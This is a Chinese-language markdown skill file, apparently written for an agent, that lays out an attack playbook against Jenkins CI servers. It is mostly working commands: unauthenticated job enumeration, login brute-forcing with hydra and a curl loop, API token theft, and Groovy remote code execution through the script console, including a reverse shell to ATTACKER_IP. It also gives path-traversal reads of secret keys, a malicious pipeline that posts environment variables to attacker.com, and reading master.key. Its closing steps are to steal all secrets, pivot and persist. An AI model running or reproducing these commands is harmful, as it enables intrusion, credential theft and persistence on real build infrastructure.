---
name: jenkins-attack
type: attack
category: ci-cd-exploitation
platform: jenkins
severity: high
---

# Jenkins 攻击技能

## 触发条件

- 发现 Jenkins 实例
- 有 Jenkins 凭证或可以访问
- 用户要求"攻击 Jenkins"

## 前置检查

```bash
# 1. 检查 Jenkins 是否可访问
curl -I http://jenkins.example.com

# 2. 检查版本
curl http://jenkins.example.com/api/json

# 3. 检查是否需要认证
curl http://jenkins.example.com/api/json?tree=jobs[name,url]
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 测试未授权访问
curl http://jenkins.example.com/api/json?tree=jobs[name,url,builds[result]]

# 2. 列出所有 jobs
curl http://jenkins.example.com/api/json?tree=jobs[name,url]

# 3. 获取 job 配置
curl http://jenkins.example.com/job/JOB_NAME/config.xml

# 4. 触发 build
curl -X POST http://jenkins.example.com/job/JOB_NAME/build
```

### 方法 2: 凭证破解

```bash
# 1. 获取用户列表
curl http://jenkins.example.com/asynchPeople/ | grep -o 'user/[^"]*'

# 2. 暴力破解
# 使用 hydra 或 medusa
hydra -L users.txt -P passwords.txt http-post-form://jenkins.example.com/j_acegi_security_check

# 或使用脚本
for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
        curl -X POST http://jenkins.example.com/j_acegi_security_check \
          -d "j_username=$user&j_password=$pass&from=/&Submit=log+in"
    done
done
```

### 方法 3: API Token 窃取

```bash
# 1. 如果有低权限用户，登录后获取 token
curl -u user:password http://jenkins.example.com/me/api/json?tree=apiKey

# 2. 列出其他用户的 tokens
curl -u user:api_token http://jenkins.example.com/credentials/api/json?tree=credentials[credentials]

# 3. 使用 API token 访问
curl -u user:API_TOKEN http://jenkins.example.com/api/json
```

### 方法 4: Script Console RCE

```bash
# 1. 访问 script console
curl http://jenkins.example.com/script

# 2. 执行 Groovy 脚本
cat > rce.groovy <<'EOF'
def command = "whoami"
def proc = command.execute()
proc.waitFor()
println proc.text
EOF

# 通过 POST 提交
curl -X POST http://jenkins.example.com/scriptText \
  --data-urlencode "script=$(cat rce.groovy)"

# 3. 反向 Shell
cat > shell.groovy <<'EOF'
def s = new Socket("ATTACKER_IP", 4444)
def proc = ["bash", "-i"].execute()
proc.waitForProcessOutput(s, s)
EOF
```

### 方法 5: 利用旧漏洞

```bash
# CVE-2018-1000861 - 路径遍历
# 下载文件
curl 'http://jenkins.example.com/job/JOB_NAME/ws/../../secrets/keys'

# CVE-2019-1003000 - RCE in CLI
wget http://jenkins.example.com/jnlpJars/agent.jar
java -jar agent.jar -url http://jenkins.example.com -websockethttp
```

### 方法 6: Pipeline 注入

```bash
# 1. 创建恶意 Pipeline
cat > malicious-pipeline.groovy <<'EOF'
pipeline {
    agent any
    stages {
        stage('Backdoor') {
            steps {
                sh 'curl -X POST https://attacker.com/exfil -d "$(env)"'
            }
        }
    }
}
EOF

# 2. 通过 API 创建 job
curl -X POST http://jenkins.example.com/createItem \
  -u user:api_token \
  --data-binary @malicious-pipeline.groovy \
  -H "Content-Type: text/xml"

# 3. 触发执行
curl -X POST http://jenkins.example.com/job/malicious-pipeline/build
```

### 方法 7: 凭证窃取

```bash
# 1. 读取 config.xml
curl http://jenkins.example.com/config.xml

# 2. 读取 credentials.xml (如果有权限)
curl http://jenkins.example.com/credentials/api/json?tree=credentials[credentials]

# 3. 读取 secret keys
find /var/jenkins_home/secrets/ -type f 2>/dev/null

# 4. 读取 master.key
cat /var/jenkins_home/secrets/master.key
```

## 验证成功

```bash
# 成功执行命令
# 在 script console 中看到输出

# 成功获取 token
# 可以使用 API token 访问

# 成功反向 Shell
# 在 nc 中收到连接
```

## 下一步

1. 使用 Jenkins 访问其他系统
2. 窃取所有 secrets
3. 通过 Pipeline 持久化
